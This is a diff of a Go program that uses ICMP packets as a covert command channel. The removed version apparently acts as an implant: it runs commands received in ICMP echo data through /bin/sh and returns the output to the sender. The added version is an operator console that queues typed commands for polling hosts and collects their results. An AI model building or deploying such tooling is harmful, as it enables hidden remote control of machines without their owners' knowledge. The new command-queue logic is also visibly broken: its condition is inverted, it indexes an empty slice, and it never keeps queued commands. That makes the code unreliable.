@@ -1,60 +1,74 @@
 package main
 
 import (
+	"bufio"
+	"fmt"
 	"github.com/andrewdo/go-icmp-data/transport"
-	"golang.org/x/net/icmp"
 	"log"
-	"os/exec"
+	"os"
 	"strings"
 	"sync"
 )
 
-func handleMessages() {
+func serveCommands(cmdCh chan string, outCh chan string) {
+	cmds := make([]string, 0)
 	for {
-		ch := make(chan transport.Packet)
+		ch := make(chan *transport.Packet)
+		go transport.Receive(ch)
 		for {
-			go transport.Receive(ch)
 			select {
 			case p := <-ch:
-				switch p.Message.Code {
-				case transport.IcmpCodeCommandMsg:
-					handleCommandMessage(p)
-					break
-				default:
-					log.Println("Unhandled ICMP code", p.Message.Code)
-				}
-
+				handlePacket(p, cmds, outCh)
+				break
+			case cmd := <- cmdCh:
+				cmds = append(cmds, cmd)
 				break
 			}
 		}
 	}
 }
 
-func handleCommandMessage(p transport.Packet) {
-	if b, ok := p.Message.Body.(*icmp.Echo); ok {
-		cmd := strings.TrimSpace(string(b.Data))
-		log.Println("Got command", cmd)
-
-		c := exec.Command("/bin/sh", "-c", cmd)
-		o, err := c.CombinedOutput()
-		if err != nil {
-			log.Println(err)
+func handlePacket(p *transport.Packet, cmds []string, outCh chan string) {
+	switch p.Message.Code {
+	case transport.IcmpCodeCommandRequest:
+		// reply with next command, if any
+		if len(cmds) > 0 {
+			go transport.Send(*p.From, []byte(""), transport.IcmpCodeCommandReply)
+		} else {
+			go transport.Send(*p.From, []byte(cmds[0]), transport.IcmpCodeCommandReply)
+			cmds = cmds[:1]
 		}
-
-		log.Println("Sending output", string(o))
-		go transport.Send(*p.From, o, transport.IcmpCodeCommandReply)
-
-		return
+		break
+	case transport.IcmpCodeCommandOutput:
+		// pass the command out thru the channel
+		outCh <- string(p.Body.Data)
+		go transport.Send(*p.From, []byte(""), transport.IcmpCodeAck)
+		break
 	}
-
-	log.Println("Ignoring ICMP message", p.Message)
 }
 
 func main() {
-	var wg sync.WaitGroup
-	wg.Add(1)
+	cmdCh := make(chan string, 0)
+	outCh := make(chan string, 0)
+	defer close(cmdCh)
+	defer close(outCh)
 
-	go handleMessages()
+	var wg sync.WaitGroup
+	wg.Add(2)
+
+	go serveCommands(cmdCh, outCh)
+	go func() {
+		for {
+			fmt.Print("> ")
+			reader := bufio.NewReader(os.Stdin)
+			cmd, err := reader.ReadString('\n')
+			if err != nil {
+				log.Fatal(err)
+			}
+
+			cmdCh <- strings.TrimSpace(cmd)
+		}
+	}()
 
 	wg.Wait()
 }
